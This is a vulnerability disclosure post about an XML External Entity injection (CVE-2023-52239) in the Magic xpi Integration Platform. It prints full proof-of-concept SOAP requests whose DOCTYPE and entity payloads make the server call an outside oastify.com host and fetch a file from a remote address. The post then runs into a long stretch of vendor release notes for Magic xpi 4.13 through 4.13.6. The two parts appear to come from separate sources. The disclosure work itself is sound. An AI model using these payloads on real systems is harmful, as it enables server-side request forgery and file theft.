## [XML External Entity Injection (XXE) in Magic® xpi Integration Platform (CVE-2023-52239)](http://192.168.1.161/post/xml_external_entity_injection_magic_xpi/)

## Introduction

During one of our assessments we found a so called XML External Entity Injection (XXE) vulnerability in the Magic® xpi
Integration Platform ([https://www.magicsoftware.com/integration-platform/xpi)](https://www.magicsoftware.com/integration-platform/xpi%29).

After disclosing this information to the vendor, they fixed it immediately. Communication was always profesional.

[CVE-2023-52239](https://nvd.nist.gov/vuln/detail/cve-2023-52239) has been assigned to this vulnerability.

## What is an XML External Entity Injection?

### A short explaination

An XML External Entity (XXE) Injection is a security vulnerability that occurs when an attacker can influence the processing of XML input to include external entities, often leading to unauthorized access or disclosure of internal files and information. This type of attack exploits the ability of XML parsers to interpret external entities, allowing the attacker to manipulate the application’s behavior and potentially extract sensitive data.

## The vulnerability in magic xpi

The XXE was very classical, allowing the inclusion of an external entity.

*Affected Software:* <https://www.magicsoftware.com/> (Version: 4.13.4)

The vulnerability allows an attacker to cause the web server to execute `HTTP` or `FTP` requests to other third-party systems.

It was also possible to cause an HTTP request to external services with the following request.

```
POST /services/ON_DataHandling/onItemImport HTTP/2
Host: soap-test01.abc.com
Content-Type: text/xml; charset=utf-8
Soapaction: document/http://localhost:6060/:itemImport
User-Agent: PostmanRuntime/7.32.3
Authorization: Basic xxxx
Accept: */*
Postman-Token: fcef1dd4-6ac0-423a-9027-3a714b4e3ca8
Accept-Encoding: gzip, deflate
Connection: close
Content-Length: 2643
<?xml version="1.0" encoding="utf-8"?><!DOCTYPE soap:envelope PUBLIC "-//B/A/EN" "http://9blpqy1jw2vryok1fdqjw8kz9qfm3craf16owcl.oastify.com">
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
  <soap:Body>

```

In the request above, the payload `<!DOCTYPE soap:envelope PUBLIC "-//B/A/EN" "http://9blpqy1jw2vryok1fdqjw8kz9qfm3craf16owcl.oastify.com">` was added, which causes the application to send the following HTTP request to the external URL.

```
GET / HTTP/1.1
Cache-Control: no-cache
Pragma: no-cache
User-Agent: Java/1.8.0_241
Host: 9blpqy1jw2vryok1fdqjw8kz9qfm3craf16owcl.oastify.com
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: keep-alive

```

This already proves, that external entities are evaluated and executed. Besides external `HTTP` requests, it was also possible to request external files via the `FTP` protocol. The following request includes the payload `file:\\172.19.8.50/test.txt` which accesses the file named `test` via FTP from the server with the IP address `172.19.8.50`. For authentication the application uses the username `anonymous` and the used java-version `Java/1.8.0_241` as the password.

```
POST /services/ON_DataHandling/onItemImport HTTP/2
Host: soap-test01.abc.com
Content-Type: text/xml; charset=utf-8
Soapaction: document/http://localhost:6060/:itemImport
User-Agent: PostmanRuntime/7.32.3
Authorization: Basic xxxx
Accept: */*
Postman-Token: fcef1dd4-6ac0-423a-9027-3a714b4e3ca8
Accept-Encoding: gzip, deflate
Content-Length: 145
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:\\172.19.8.50/test.txt"> ]>
<sessionId>
&xxe;
</sessionId>

```

To receive the above-mentioned FTP request the program FileZilla was used. The following screenshot shows the incoming request in FileZilla.
![FTP-Server-Side of the above request](../../files/xxe_ftp_connection_logs.png)

While enumerating different filters, it was determined, that the `jar://` URL handler was registered by the application. This makes sense, because the affected application (magic xpi) is apparently written in java. Combined with the ability to request external resources via HTTP or FTP, execution of an arbitrary java was thought to be possible.
So a `JAR` file was created and requested, as it can be seen in the following two figures. First a non-existing entry got specified, resulting in another Path disclosure.

![Giving a false JAR entry results in Path disclosure ](../../files/xxe_path_disclosure.png)

If an existing entry point is specified, the JVM shows the error “Invalid byte 2 of 2-byte UTF-8 sequence.” This usually means that the encoding of the XML file does not match with the encoding configuration of the parser. Due to time constraints in our assessment it was not possible for us to get to the bottom of this. However, it is certainly possible to exfiltrate arbitrary files and paths as well es to perform the famous [Billion laughs attack](https://en.wikipedia.org/wiki/Billion_laughs_attack).

![Trying to execute the Java with the valid entry point](../../files/xxe_byte_sequence.png)

Magic xpi 4.13.6: New Features

xpi Cloud Native
This release of Magic xpi brings a complete new and re-architected Cloud Native

implementation, focusing on a simplified, user friendly, automated deployment approach. This is
enabled via the Magic xpi Cloud Manager which does all the heavy lifting of the Cloud

deployment process and hides the technical complexities behind a set of REST APIs. The Cloud

manager therefore provides a seamless, tested and verified approach to the Cloud deployment of

the Magic xpi Kubernetes cluster.

With the help of the REST APIs you can do the following:

  Create xpi runtime environment
  Deploy the peripheral services
  Manage the project deployment life cycle

xpi Cloud Native uses Kubernetes as a method of deployment and is fully verified on AKS.

To learn more about the xpi Cloud Native implementation, please follow the online

documentation.

Azure Key Vault Integration
Magic xpi now supports integration with Azure Key Vault. The secrets in the vault can be

accessed and used in the xpi runtime as environment variables. With the ExternalVaultReload
function, you can reload the secrets during the execution without requiring you to restart the

project.

For more information, refer to the How Do I Access Azure Key Vault Secrets? page in the Magic

xpi help.

10

Enhancements

LA Support for REST Client
The REST Client is now Local Agent compatible. The Local Agent details can be added on the

REST Client Resource.

SOAP Headers for Salesforce
The SOAP headers required for the Salesforce request are now set as a blob value in the XML

format on the Salesforce component step.  Magic xpi will send these pre-populated headers and

their values as-is in the Salesforce request.

SAP B1 Inventory Counting and Inventory Posting Services Support
SAP Business One component now provides support for two additional services namely, Inventory

Counting and Inventory Postings.

HCL Domino Support
Magic xpi now supports HCL Domino Server v12.x

OAuth2 Authentication for POP3
The OAuth2 authentication support for the POP3 protocol is added to the Email component.

11

Migration/Upgrade Considerations

  No such considertations are observed in this release of Magic xpi.

The Migration/Upgrade Considerations documented for the past releases are still applicable.

Known Issue

  The fix for the ticket MXPI-24750 provided in the Magic xpi 4.13.5 release is reverted as the

fix caused another issue. For more details refer to the error in the Data Mapper logs.

  When using JDBC as datasource for accessing MySQL, MSSQL and DB2/400 databases the
Unicode characters are inserted/updated as garbled text. For DB2/400, the issue also occurs
using Mapper database schema.

  Any change in the value of property magic.w3.concerted.response.name will take effect only

after a restart of the "Magic xpi SOAP server" service.
Note: This change will affect all schemas of all RPC type Web Services, and therefore all
SOAP Client steps pointing to RPC type request will need regenerating the schema using the
"Load Service" operation of the Web Services resource.
Change in the response schema will call for mapping changes/correction to applicable the
Data Mapper steps.

15

In this release of the maintenance version of Magic xpi 4.13.5, we are delighted to offer you

enhancements on top of the existing features.

Magic xpi 4.13.5: New Feature

Cloud Native
Magic xpi is now Cloud Native enabled and seamlessly integrates with technologies like Docker

and Kubernetes. With this you can run scalable xpi projects in public, private or hybrid Cloud

and leverage all the benefits like ease of deployment, high availability, quick scaling, offered by

the Cloud delivery model. With this feature you can:

  Create dockerized xpi runtime environment using scripts and templates provided as part of

installation

  Create xpi project docker image from Studio as well as command line

Project HotSwap
When an updated version of the project needs to be deployed, the prior version of Magic xpi

project that is currently deployed needs to be shutdown. The HotSwap feature automates this

upgrade process with smooth transition to the new updated project(s) with near zero downtime.

While using the HotSwap deployment method, the traffic on the triggers in the project seamlessly

transfers from the current deployed version to the updated/swapped version of the project. With

this approach, retention of all business events, its logic and data integrity are maintained.

xpi Monitor
The new xpi Monitor introduced in this release is a complete UI refresh of the current Magic

Monitor. It is redesigned to provide a better user experience and improve usability. This version

brings more visually appealing and intuitive interface for managing and monitoring the xpi

projects. It includes new features like optimized pagination, better filters, and localization.

Note: This new xpi Monitor is released as Beta.

16

Enhancements

The Recursion Support for JSON Schema
Prior to Magic xpi 4.13.5, the JSON schema with recursive elements was not displayed properly

in Data Mapper. Now with the new Recursion Depth property added in the JSON schema, the

recursive element can be rendered in the Mapper as per the value provided for the property.

Sugar CRM API Version Upgrade
The Sugar CRM component is compatible upto API version 12.1.

Migration/Upgrade Considerations

  The Web Services schema for request and response is modified to comply with W3C

specifications. This may cause any existing Web Services Client consuming these services
from the migrated xpi projects to fail. To maintain backward compatibility, you would need to
add the flag magic.w3.concerted.response.name in the config.properties file and set the
value to False.

If the Magic xpi project with SAP ERP component is upgraded or migrated to xpi 4.13.5
version, for the Read operation, the filter criteria for Table may not fetch the result as per the
defined filter. To resolve this, open the SAP ERP step and save it again by clicking the OK
button. Once the project is saved, run the Clean Solution option and then rebuild the project.

Known Issues

  MATMAS IDOC is not sent to SAP successfully when Business and Global type of variables

are used as Transaction ID holder.

  Running operations for certain WSDL using the Web Services Client may return

java.lang.NullPointerException.

We are focused on fixing these issues at the earliest.

In this release of maintenance version of Magic xpi 4.13.3, we are delighted to offer you a new

Data Connector in Data Mapper to work with the JDBC interface and some enhancements on top

of the existing features.

Magic xpi 4.13.3: New Features

JDBC Data Connector in Data Mapper

A new JDBC Data Connector (schema) is introduced to access databases using the JDBC

interface. This Data Connector is available as the Source and Destination in the Data Mapper

and can be used in conjunction with existing Database schema.

This schema requires a JDBC resource and within the resource you can configure the connector to

be running under Local Agent.
Using this connector, you can connect to various databases using their respective drivers.

Please refer to the Magic xpi Help to identify the list of JDBC drivers tested and verified.

File Watcher Step

The File Watcher step lets you Read, Move, Rename and Delete files on the file system. It provides

support to Local Agent. It supports two types of file systems, Disk (LAN) and FTP (also includes

FTPS). The Disk option includes physical as well as network storage. For the FTP option, the SFTP

protocol is supported.

Enhancements

OAuth2 Support in Dynamics CRM
The Dynamics CRM component now supports OAuth2 type of authentication. The Tenant ID,

Client ID, and Client Secret values required for OAuth2 authentication can be configured on the

Dynamics CRM resource.

Sync Mode in File Watcher Trigger
The File Watcher Trigger has introduced a new Sync Mode to guarantee the ordered delivery of
scanned files.

27

Behavior Changes

  The elevated or admin rights are no longer required for the Magic xpi Studio and the Studio

can now be run by the non-admin local user. The admin rights will still be required for
Installation of the product as well as stopping and starting of all services.

  All the column names in the Data Mapper wizard will be encapsulated in square brackets.
  The default encoding for SAP ERP trigger is changed from UTF-16 to UTF-8.

Migration/Upgrade Considerations

  The Dynamics CRM resource created prior to Magic xpi 4.13.3 release will be migrated to

use Basic type of authentication.
If you are migrating from Magic 4.13, please read the Migration/Upgrade Considerations
section in Magic xpi 4.13.1.

Known Issue

  When inserting large data, the Insert, Update and UPSERT operations may fail with an error

for the MSSQL, MySQL, Oracle and DB2/400 databases.
We are currently reviewing this issue and will provide you a fix for this in the upcoming
patch.

  The javaw.exe process keeps running and does not get terminated even when the

GigaSpaces service is shutdown.

  For the File Watcher and FTP component step, if the output parameter is assigned a variable

In this release of maintenance version of Magic xpi 4.13.2, we are delighted to offer you

enhancements on top of the existing features.

Magic xpi 4.13.2: New Features

Microsoft Dynamics 365 for Finance and Operations
Connector

Magic xpi has introduced a new Dynamics 365 Finance and Operations connector which

enables integration with Microsoft Dynamics 365 APIs.

This connector offers the following features:

  A query wizard to build complex queries while still allowing the user to manually enter and

modify queries

  Cross-company support to fetch the data from the user's default company or all the companies

accessible to the user

  Support for Dynamics 365 CE module
  Local Agent Compatibility

File Watcher

The File Watcher is a new trigger to monitor the files created on the file system. It provides

support for Local Agent.

The trigger supports two types of file systems, Disk and FTP. The Disk option includes physical as

well as network storage. For the FTP option, the SFTP protocol is supported.

This trigger can perform Move, Delete and Rename operations on the files.

31

Enhancements

API Support
The Salesforce and ServiceMax connectors are now upgraded to support the API version 51.0.

FTP Local Agent Compatible
The FTP connector is built using the new SDK and provides Local Agent support.

Read Interface in SAP ERP
The SAP ERP component has a new interface type Read which introduces two new operations

namely Query and Table. The Query read operation is performed using the

RSAQ_REMOTE_QUERY_CALL function and the Table read operation is performed using the

RFC_READ_TABLE function. Users can also define filter criteria for selected columns and provide

additional custom filters.

Behavior Change

  The TIMESTAMP field in the Data Mapper is now shown as Alpha type instead of DATE type.

For the projects migrated from Magic xpi 4.7.x to 4.13 and above, to extract the DATE
portion of the TIMESTAMP, use the DVal function in the Data Mapper. This change has to be
done manually.

Migration/Upgrade Considerations

  The project build may not work at Command Line for a project with an FTP component after

upgrading or migrating it to the Magic xpi 4.13.2 version. To resolve this, open the project in
the Studio once for any migration activity that may be needed.

32

Known Issue

  SAP B1 resource may fail to validate for SAP B1 V10 with MSSQL database. To fix the issue,

install SAP B1 and MSSQL database before installing Magic xpi.

  The Dynamics CRM Resource helper will not be able to retrieve the Organizations List for the
On-Demand Deployment Type due to discontinuation of the Discovery service from Microsoft.
As a solution enter the name of the Organization manually or select the Environment Variable
that contains the same.

It is mandatory to have the Magic Monitor password as Alpha-numeric combination. Numbers
only password will fail. For example, password 1234 is invalid and A1234 is valid.

  The FTP DAM methods File Exists, Get Operating System and Directory Listing are not

supported in a single step when the FTP resource is configured with Local Agent value as True.

In some scenarios, it has been noticed that the Dynamics CRM component gives an error
"Arithmetic operation resulted in an overflow" when fetching the data from the server.

In this release of maintenance version of Magic xpi 4.13.1, we are delighted to present you 3

new connectors, database password encryption support, 4 new functions and so on. Along with

that the product offers enhancements on top of the existing features.

Magic xpi 4.13.1: New Features

We offer you following 3 new connectors:

Knowi

The Knowi connector is based on an idea of providing a way to post and query the data into

Knowi.
It allows the user to invoke Knowi REST APIs from the Magic xpi flow to pull the data from the

existing datastores or push the data to Knowi server.

Matics

The Matics connector provides connectivity to the Matics server with read and write capabilities.

It pulls the Interfaces list from the Matics server on resource validation.

It also allows the user to invoke Matics REST APIs from the step.

EDI

The EDI connector is designed with an idea of letting the user configure access to the EDI server

and do the document transaction for different business partners.

It allows the user to access the EDI server to receive EDI Document Types from different Partners. It

also enables the user to post an EDI Message for a particular EDI Document Type, Get the list of

the Messages on the EDI server, and the message status.

38

Enhancements

Internal Database Password Encryption
Magic xpi now supports encryption of password for the internal database configured during the

installation.

When installing Magic xpi 4.13.1, on top of an older version, the installer process automatically

encrypts the password for the internal database.

The password configured under the Magic Monitor configuration file also gets encrypted once the

GSA and Monitor Display Server services are restarted.
You can also choose to change the password later. For more information, refer to How to Change

the Database Password page in the Magic xpi Help file.

Functions to Search Regular Expressions
In this maintenance version, 4 new functions have been added to the list of supported functions.

This will enhance the regular expression support in Magic xpi.

The new functions are:

  RegExMatch
  RegExGetGrp
  RegExSearch
  RegExReplace

OAuth 2 Support in Email & Exchange Components
The Email and Exchange components now support OAuth 2 as an authentication type. The OAuth

2 details can be configured on the Email and Exchange resources respectively.

XML Validation for Data Mapper
When validating the source or destination XML files, Data Mapper now gives additional

information along with the error "Source XML not valid" for invalid data. The reported error will

show the name and ID of the relevant schema.

39

Migration/Upgrade Considerations

  On upgrading a project from xpi 4.13 to 4.13.1, the connection in Data Mapper step(s) may

be lost in case the step was configured with MSSQL or Oracle database at Source or
Destination side. The connection loss will be there if the step is created or updated ad a result
of refresh schema function in the 4.13 version.
This was introduced due to an accidental defect in xpi 4.13. The field names in MSSQL were
handled without case sensitivity, causing the Mapper to fail in some cases where the
database was set to case sensitive for column and table names.
The fix now causes the field names to be identified with the case that it is defined in, thus
breaking the mappings wherever these columns were used.

To resolve the issue, all the broken connections have to be manually recreated.

40

Known Issue

  Amazon Corretto Java 8.282.08.1 version is not supported for GigaSpaces on the Windows

platform.

  The SAP B1 resource does not get validated for the SAP B1 V10 when the Database Server

Type is MSSQL 2016 or 2019.

  The Restart operation on the Agent's tab of the Local Agent Management Console does not

work if the Local Agent service is running inside a dos command shell.
The same works when the command prompt is started with the Administrator privileges.

If the connectors' names contain Non-English/Unicode characters, they are displayed
incorrectly in the <Local Agent Installtion>/addons folder when deployed through the Local
Agent Management Console.
The same works when the command prompt is started with the Administrator privileges.

  The timeout value defined in the TCPListener service will not be considered if the value for

RequesterTimeoutSec property is defined in the mgreq.ini file.

  When Unicode characters are used in an OPC component, the component gives an error at

runtime as "Error 210: Item [???] is not found".

  When a project is migrated or upgraded to Magic xpi 4.13 and then the SQL Statement is

modified or the schema is refreshed, the Data Mapper connections are lost.
To resolve the issue all the broken connections have to be manually recreated.

  When Magic xpi 4.13.1 is installed on top of xpi 4.13 with server-only installation mode, the

projects having Dynamics AX or WCF components do not run and throw an error.

In the Environment Settings utility, the OAuth2 process on the Email resource throws an "The
remote server returned an error: (400) Bad Request." error.

  The arguments section of the Connector Builder incorrectly allows to add duplicate arguments

with the same name ignoring the case.

In this release of Magic xpi 4.13, we are delighted to present you features such as new

components, Magic SOAP Server and so on. Along with that the product offers greater

enhancements on top of the existing features.

Magic xpi 4.13: New Features

DB Trigger Component

Magic xpi has introduced a new DB Trigger component. It lets the user to continuously monitor the

database tables for Create, Update, or Delete events.

To work with this feature, the user has to:

  Create a new DB Trigger Service and provide the database details
  Select the tables for which the Create, Update, or Delete events have to be monitored
  Modify and run the template SQL script created by the service, to create triggers in the

database

  Define the polling interval for these events on the trigger configuration
  Define the cleanup age for processed records on the DB Trigger service

OPC Connector

Magic xpi offers a new OPC connector that enables the secure data collection from PLCs and IoT

devices as well as industrial, and measurement equipment.

The user can configure the OPC server and channels on the OPC resource. The Devices, their

Addresses and Static Tags can be defined on the step.

Magic SOAP Server

Magic xpi has now introduced the new Magic SOAP server replacing the Systinet Server for Java

and library dependencies. It is lightweight with a simplified Web interface. The migration efforts

from the old Systinet Server are negligible. It supports Basic and Digest Authentication.

Calendars

Magic xpi now has provision to create Calendars which let the users add a list of dates. Users

can create one or more Calendars entries.

This will be useful for the user in the following scenarios:

  When a Calendar is configured on the Scheduler service, it will prevent the scheduler from

running on the dates defined by the selected Calendar.

  When a Calendar is configured on the Flow Enablement service, it will deactivate the flow

from running on the dates defined by the selected Calendar.

For more information, refer to the Calendars page in the Magic xpi Help file.

46

Logs Collector Tool

Magic xpi has now introduced a new tool called Logs Collector that collects log files, dump files,

configuration files, scripts, and other files useful for troubleshooting. This provides collection of

diagnostic information in a single archive file. The users can provide this archive file to the

support for the root cause analysis of the problem.

47

Feature Enhancements

Data Mapper - Ease of Use

  The new Data Mapper filter facilitates the users to navigate through complex schemas quickly,

search a particular node by name or data type, and map it from the Source side to the
Destination side. This feature also allows the users to filter the nodes by their data types.
Search by Regular Expressions is also supported.

  The Connect All feature is now enhanced to support multiple connection logic as described

below:

o  Simple: This connection logic is same as the previous versions with the addition of

supporting case insensitive matching.

o  Fuzzy: This connection logic will follow the rules of the Simple matching with the

addition of matching the Source node name to the Destination node name using the
logic in the given order; begins with, ends with, and contains.

o  1:1: This connection method will not follow any special logic other than trying to

connect each Source node to its adjacent node.

The new Data Mapper design allows the users to multi-select nodes from the Source to the
Destination to perform any of the above options.

In the Save and Load Connections feature, the Save function enables the user to save the
schema types and their connection lines as templates to be loaded into any Mapper step with
similar schemas in the feature.

     Note: This feature should be seen as an extension of the Connect All feature and does not

relate to the existing Export and Import features of the Mapper.

OData Pagination Support
The OData component now supports the pagination feature of the OData API. The maximum

number of pages per request and the next page link required for pagination can be configured

on the OData step configuration.

The Next page link value can be used instead of Endpoint URL, by selecting the Use NextLink as

Endpoint check-box on the OData step configuration.

48

OData Annotations Support
The OData resource now supports the configuration of entity level, and row level annotations.

Once configured, these annotations will be available on the Data Mapper schema for the OData

step. The entity level annotations will be shown at the root level under the annotations element

and the row level annotation will be under the rowAnnotations element for each row.

Side-by-side Installation Support
Two parallel installations of Magic xpi on the same system are now allowed.

If the system has a version older than xpi 4.13 installed, the user will be given a choice to either

upgrade the existing installation or create a new one without removing the old installation.

Database Partitioning Support
Database partitioning is now supported for MSSQL and Oracle databases. It can be enabled by

selecting the DB Partition check-box in the Database Support screen of the installation wizard.

Logging Improvement
The logging system is now changed from older log4j infrastructure to newer SLF4J and Logback

for the Magic xpi components. Logging can also be flexibly configured using a separate file for

each component. The support to the older log4j system is deprecated and is not recommended as

it has lower performance.

GigaSpaces Upgrade
The GigaSpaces version in Magic xpi is upgraded to 15.2. This version also adds support for

running the GigaSpages Management Console in Local mode.

Local Agent Silent Installation
Local Agent now supports the silent installation. The installer comes with the config.ini file with

default configuration values. The user can change the default values as per requirement. The

installer will read these values while starting the installation.

Auto Installation of Connectors in Local Agent
The user can install addon connectors as a part of the Local Agent setup. The required connectors

should be present in the LAN\steupLA\addons folder of the installer. By default, the installer will

not overwrite the existing connectors with the same name. To change this behavior, set the value

of the [Connectors]Overwrite flag to true in the config.ini file.

49

Support for Multiple Management IDs
Magic xpi Local Agent now supports multiple Management IDs which are managed as part of the

management-ids.xml file. The Management Console can now show the Agents, Agent

Connectors, and Connectors associated with all the Management IDs or associated with a

selected Management ID. This can be done from the All Management IDs drop-down menu on the
Local Agent Management Console.

Additional Critical State Alerts
Two additional critical state email notifications related to the GigaSpaces are added to Magic

Monitor. The password for sending the email is stored in an encrypted format.

Stall Processing on Critical Condition
The Magic xpi server can now be paused, if the server reaches a critical state. The server will

wait based upon an exponentially increasing delay algorithm and will resume once the system is
healed.

This behavior can be enabled by setting the flag PauseOnCriticalConditions in the

[MAGICXPI_GS] section of the Magic.ini file. The default value for this variable is N.

FTP Server Command
FTP Component now allows the user to run server command on the FTP server.

Apache Tomcat Upgrade
Apache Tomcat® installation is upgraded to version 9.0.35 to address the security vulnerabilities.

API Support
The Salesforce and ServiceMax connectors are now upgraded to support the API version 48.0.

Attach to Project
Attach to Project support is added in Magic xpi. It can be used to connect the Studio debugger to

a deployed instance of a project.

50

Behavior Changes

  The logging for Salesforce and ServiceMax components is now controlled using Logback.xml
infrastructure and the Debugging Flag “DebugSFDCComponent” is no longer applicable for
the component.

  The Data Mapper destination does not create an XML node when there is no value in the

source XML and the XML schema property Always create node is set to N.

51

Known Issues

If you install an older version of Magic xpi on top of an existing one, then it may lead to
inconsistent behavior.

  The Web Services Client details are displayed as empty when the project is opened using the

Environment Settings window. Once the project is opened in the Studio, the values get
displayed correctly in the Environment Settings.

  The Sigar library is not compatible with Oracle JDK update 261 on Windows Server 2019

due to which the GSA service fails to start. To fix the issue go to the <Magic
Installation>\Runtime\Gigaspaces\lib\optional\sigar folder and rename it.

  The UPSERT operation in the Data Mapper has limitations while handling tables having a

space character in their column names.
For PostgreSQL database, the Data Mapper tree will show “Invalid SQL statement” error.
For DB2, DB2400, MySQL, PervasiveSQL databases, the columns with space in the name are
not displayed in the Columns page due to which the wizard process will be incomplete.
  The GSA service goes into the Paused state and fails to restart when upgrading Magic xpi

4.9 or 4.12.2 to xpi 4.13 with DB2/400 as an internal database.

  After upgrading to Magic xpi 4.13 from the versions which do not support DB partitioning,

database partitions do not get created for the databases which support partitioning.
This will not break the installation but you will not be able to take the advantage of the
improved performance to the fullest. Please contact support for assistance.

  The Context View of the Debugger shows an error “The value does not support the date

format" when displaying the value for date type of a variable or for date field from the UDS
table for Japanese locale.

  When multiple Web Services triggers have the same operation names, an incorrect flow gets

invoked.

  For Japanese locale, the step execution for the IBMi component gets stuck at runtime.
  The JD Edwards Enterprise One step cannot be configured for the resource having logical

name.

  During the INSERT operation for the MySQL database, the records inserted in the tables with
names containing Japanese characters get garbled. In this case, the Update operation also
fails.

  After running the debugger for a project, the start.xml file fails to delete even when the project

is stopped and the Studio is closed.

  For the OPC component, if Unicode characters are used in the Channel name, Device name

and Item name, it fails with an error at runtime.

  Magic xpi installation does not work for Oracle 19c database.
  Automatic database creation during installation does not work for remote DB2.
